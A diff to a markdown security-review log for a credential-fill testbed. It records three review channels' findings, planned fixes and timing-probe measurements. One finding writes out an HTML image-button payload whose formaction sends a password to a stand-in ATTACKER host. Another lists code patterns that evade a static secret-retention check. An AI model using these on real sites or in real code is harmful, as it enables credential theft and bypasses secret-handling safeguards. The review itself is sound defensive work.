@@ -1030,3 +1030,78 @@ family**, failing on a missing probe. Golden vectors independently computed (sci
 consistent synthetic bias and a 5 ms shift are detected; the recorded real-browser timing mutants are still killed;
 repeated quiet and loaded observations recorded here. Implemented by Codex as slice `m4-probe-p`, reviewed by the
 three channels with the final-fix review's absorptions.
+
+## Final-fix round — three channels on 305da22..530b0cb (`m4-fix-final`) — 2026-09-02
+
+Claude QA (`G-Q*`, wt-review), Claude security (`G-S*`, wt-security), Codex (`G-X*`, pinned range, read-only). All
+three **NEEDS-ATTENTION**. Baselines on both Claude worktrees: 671 + 6 green twice, `make eval` 10/10 with 0 leaks,
+probe P 0 rejections in 5 observations of the file (quiet machine). Every A-*, §9.1, F-* item is CLOSED with a named
+killing assertion in all three closure tables except the items below.
+
+### P1
+- **G-S1 `<input type="image">` escapes the `formaction` check — confirmed plaintext leak (security).** Per HTML,
+  `form.elements` excludes image-button inputs, so `inRealm.ts`'s `type === 'image'` branch can never fire. Real
+  Chromium: a page at the authorized origin with `<input type="image" formaction="http://ATTACKER/steal">` → fill
+  `{ ok: true }`, the attacker receives `pw=<canary>&x=0&y=0`; survives the assign-time re-check. Pre-existing, but it
+  sits inside the four lines A-1 rewrote and the locked spec names `input[type=image]`. **Absorb:** enumerate image
+  buttons natively (`querySelectorAll('input[type=image]')` filtered by the native `HTMLInputElement.prototype.form`
+  getter, which also covers `form="<id>"` association) and check each `formaction` like the other candidates; fake-DOM
+  cases, lab routes (`/image-formaction`, `-external`, `-after-pin`), `REFUSED_ROUTES`, and a real-browser reproduction
+  asserting the second origin receives nothing.
+- **G-S2 / G-Q1 / G-X1 — the retention rule, round seven (all three channels).** Two gaps: (1) the round-six positive
+  pass runs only at helper depth 0, so inside `toFixedHex` the enumerative rules still govern — `for (const unit of
+  padded)`, `void (padded as any).captureForTest`, `padded.replace(/[\s\S]/gu, cb)` and `value.replace(re,
+  moduleCallback)` all pass and recover the plaintext at runtime (security T1–T3, QA); (2) approved sinks are matched
+  by identifier text and `moduleFunction()` sees only top-level function declarations, so a module-level arrow named
+  `String`, a local arrow shadowing `toFixedHex`, or a local wrapper shadowing `callFunctionOn` all pass (Codex).
+  **Absorb:** the positive pass runs at every depth with a helper-scoped allowlist; an approved sink name must resolve
+  to the global (`String`, with no binding of that name anywhere in the file) or to the single top-level declaration
+  with no shadowing binding in any enclosing scope; corpus S9–S15; the corpus moves to its own file (758-line file).
+
+### P2
+- **G-X2 hidden wrong-origin attempts (Codex; security rated the same behaviour benign).** After A-3 a valid fill at
+  an unobservable origin (`about:blank`, opaque document) emits no URL evidence, so it is invisible to `wrongOrigin`
+  and no invalid-run marker exists. No leak (the fill refuses before `resolveSecret`). **Absorb:** the fill service
+  emits the step-0 observation with `initiator: 'fill-service-unobserved'`; `wrongOrigin` excludes it from
+  `attempted`/`blocked` and reports it as a separate `unobserved` count on the scorecard (SCHEMA amended by the
+  integrator).
+- **G-X3 the CR half of `unplaceable` is untested** (deleting `|| value.includes('\r')` survives) → LF / CR / CRLF
+  table asserting no conversion, no taint, no assignment, exactly one release.
+- **G-S3 / G-Q5 undeclared departure:** `benign-login/server.ts` attestation gate `issued` → `runs` (a registered run,
+  not a completed one, can have its events attested) — required by A-2, absent from the Deviations stanza; no
+  fabrication path (completion still needs the signed receipt; `assertOutcomeAgreement` binds it). **Absorb:** state
+  the weakened postcondition in a comment and test that an unregistered run is still refused.
+
+### P3 (absorbed unless marked)
+Native `baseURI` read unproven — a plain `document.baseURI` survives because the fake realm has only a prototype
+getter (G-Q2/G-X5) → own-property shadow case + source assertion; `wrongOrigin.ts` missing-`requestId` test is
+vacuous (G-Q3) → correlating tool-result with `requestId` undefined; `runner.ts` `browser_snapshot` dispatch
+untested (G-Q4) → harness step + a `browser_snapshot` step in `safeLogin` so the real eval measures it; undeclared
+`offline.ts` empty-capture branch and the removed `\n\r` transport-corpus case (G-Q6/G-Q7/G-S5) → declared, plus a
+refusal-corpus case; `inspectSecretUses` 52 lines (G-S4/G-Q8); `capturedControl` swallows a post-operation capture
+failure without marking the lease (G-Q9) → mark `#captureFailed`; `leakScan` accepts unvalidated `secretSources`
+(G-X4) → validate at the entry; `resolveTaintedObjects` release sweep unasserted; `TranscriptWriter` surface
+assertion. **Recorded, no test:** A-4 sharing, `snapshotEvents` privacy, distinct `describe` names and `isRecord`
+`unknown` have no behavioural mutant (structural/type-only; all three channels agree).
+**Residuals:** no setter-window `<base>` exploit exists (one synchronous isolated-world call; the first effective
+`<base>` wins; `data:`/`javascript:` bases rejected by the platform); `location.origin` is direct IDL access, page-
+unpatchable in the isolated world; the evaluation-level positive control is fabricable by the same-process adversary
+(the fixture signs supplied bytes) but cannot make an incomplete cell pass; post-fill destination mutation stays
+layer 4's; `#recordTop` drops the step-0 event when the origin is unobservable (closed by G-X2). Ownership: compliant
+(Codex, QA) with the G-S3 stanza omission; conventions: one 52-line test helper.
+
+### Disposition
+**Not merge-ready as committed; one confirmed leak (G-S1) and the retention rule still non-enforcing.** Fix slice
+`m4-fix-final2` (Codex) absorbs everything above; the three channels review that diff together with the probe P
+slice `1cc9b73` (C-F1).
+
+### C-F1 evidence — probe P amended gate, integrator measurements (2026-09-02, 1cc9b73)
+```
+unit: testbed/probe 27 passed (golden vectors to 1e-9, both Holm vectors, null control, +0.25 ms bias rejected, 5 ms shift → hard clause, ordering ABBA…, mutants)
+timing file (7 tests incl. the family gate): quiet run 1 PASS, quiet run 2 PASS, loaded run (parallel suite alongside) PASS,
+  verbose run 4 (quiet): five probes p ≥ 0.078, |Δ| ≤ 0.044 ms; tripwire-match-vs-no-match (composeSupervisedHost, ~2 µs op)
+  p=2.6e-7 z=5.15 effect=0.28 Δ=+0.000001 ms p95 1.8/2.1 µs → FAMILY REJECTED (1 of 4 file runs)
+isolation of that probe (-t, 500 pairs, quiet): real ×4 p=0.69/0.87/0.45/0.046 PASS; abort-between-samples ×4 p=0.011/0.38/0.17/0.23 PASS;
+  null (both CANARY) ×4 p=0.47/0.34/0.98/0.80 PASS; medianDiffMs = 0 in every isolated run (timer quantisation; most pairs tie)
+six further full-file runs: see the addendum below
+```
